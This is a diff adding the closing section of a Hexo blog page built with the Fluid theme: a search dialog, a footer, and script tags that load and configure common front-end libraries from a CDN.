+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
